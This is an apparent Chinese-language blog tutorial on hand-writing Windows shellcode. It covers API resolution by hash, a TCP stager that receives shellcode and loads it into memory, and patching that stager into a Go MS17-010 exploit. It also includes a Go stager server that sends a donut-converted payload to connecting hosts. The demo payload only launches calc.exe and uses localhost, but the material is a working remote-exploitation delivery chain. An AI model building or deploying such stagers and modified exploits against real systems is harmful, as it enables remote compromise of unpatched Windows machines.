手搓shellcode

《20M golang to 1KB shellcode》文章中，提到了“ShellCodeFrame”项目，整体上需要改动地方蛮多的。
在搓之前，得了解下Win32API。可以参考《Programming reference for the Win32 API》文档，找到我们需要shellcode执行函数的结构体定义方法。

shellcode 1.定义函数指针

在ShellCodeFrame”项目中，修改api.h文件，添加我们的函数指针，以及定义结构体。

shellcode 2.指定函数HASH值

这里的hash值应该指的是Win32 API hash值，函数的调用实际上是对win32 api接口的调用。
我们修改"ShellCodeFrame"项目中,hash.h文件，添加我们需要的函数HASH值。

shellcode 3.通过hash值加载函数

关联之前定义的结构体，这样我们使用结构体时，就会自动调用对应函数的接口，从而我们的代码也就可以正常执行了。

shellcode 4.手搓"stager to shellcode"代码

在写的时候遇到了几个坑点，之前的文章中都没有提到，就是winsock2.h中ip地址和端口号可能使用了大小端。例如我这里的IP为"127.0.0.1"，那么我首先得转换成"1.0.0.127"然后“IPtoint”方式转换成数字“16777343”。可以用在线工具临时转换。
端口也一样，可以使用C语言htons函数进行转换。
printf("%d", htons(55555));
最终修改了代码。
Sockaddr.sin_addr.s_addr = 16777343;
Sockaddr.sin_port = 985;
在"ShellCodeFrame"项目中，修改a.start.cpp文件。
实现：TCP远程连接127.0.0.1端口5555，发送标识符“Alphabug”，然后等待接收shellcode，接收完成后加载到内存里。并且这里的内存空间给了30mb左右（抄《20M golang to 1KB shellcode》中的部分代码）。

Stager Demo

demo 1.装载shellcode

将shellcode.bin文件中ip和端口进行替换，这样就可以方便我们二次使用。利用ida、hexdump等工具找到对应的偏移位置，利用go实现大小端转换，重新构造新的shellcode。“n2n”变量指的是stager server地址。

demo 2.修改ms17-010 Exploit

采用go版的利用工具，修改源码，把我们的shellcode装载进去，这样就可以实现stager上自定义的大文件shellcode装载。

demo 3.exe to shellcode

使用go写一个简易的程序，生成后，利用donut工具，转换下。
package main

import(
    "fmt"
    "os/exec"
)

func main(){    
    c := exec.Command("calc.exe")

    if err := c.Run(); err != nil { 
        fmt.Println("Error: ", err)
    }   
}
执行编译，模式pie
go build -buildmode=pie -o calc.exe calc.go
exe转换shellcode
donut.exe -i calc.exe -o calc.bin
donut.exe工具生成的shellcode就特别大，2.37MB.

demo 4.stager server demo

构造一个简易的stager server。
package main

import (
    "io/ioutil"
    "log"
    "net"
)

func main() {
    Stager,err := net.Listen("tcp","0.0.0.0:12345")
    if err != nil {
       log.Fatalln(err)
   }
    sc,err := ioutil.ReadFile("calc.bin")
    if err != nil {
       log.Fatalln("ReadFile: ",err)
   }
    for{
       session,err := Stager.Accept()
       if err != nil {
          log.Println(err)
          continue
      }
       log.Println("[MS17010]",session.RemoteAddr().String())
       buf := make([]byte,10240)
       n,err := session.Read(buf)
       if err != nil {
          log.Println(err)
          continue
      }
       log.Println("[MS17010][Message]",buf[:n])
       n,err = session.Write(sc)
       if err != nil {
          log.Println(err)
          continue
      }
       log.Println("[MS17010][SendSize]",n)
       _ = session.Close()
   }
}
